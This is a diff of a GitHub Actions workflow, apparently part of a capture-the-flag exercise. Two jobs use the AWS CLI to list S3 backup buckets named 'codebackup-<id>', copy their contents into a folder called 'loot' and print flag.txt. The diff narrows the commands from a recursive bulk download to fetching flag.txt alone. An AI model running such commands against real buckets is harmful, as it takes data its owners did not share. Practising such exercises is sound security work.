@@ -21,17 +21,11 @@ jobs:
 
       - name: jovb4kjb
         run: |
-          echo "Listing the hidden prefix..."
-          aws s3 ls s3://codebackup-jovb4kjb/github/ --recursive
-
-          echo "Downloading everything..."
-          aws s3 cp s3://codebackup-jovb4kjb/github/ ./loot --recursive
-          cat loot/flag.txt
+          aws s3 ls s3://codebackup-jovb4kjb/github/
+          aws s3 cp s3://codebackup-jovb4kjb/github/flag.txt .
+          cat flag.txt
       - name: hkm1wim5
         run: |
-          echo "Listing the hidden prefix..."
-          aws s3 ls s3://codebackup-hkm1wim5/ --recursive
-
-          echo "Downloading everything..."
-          aws s3 cp s3://codebackup-hkm1wim5/ ./loot --recursive
-          cat loot/flag.txt
+          aws s3 ls s3://codebackup-hkm1wim5/github/
+          aws s3 cp s3://codebackup-hkm1wim5/github/flag.txt .
+          cat flag.txt
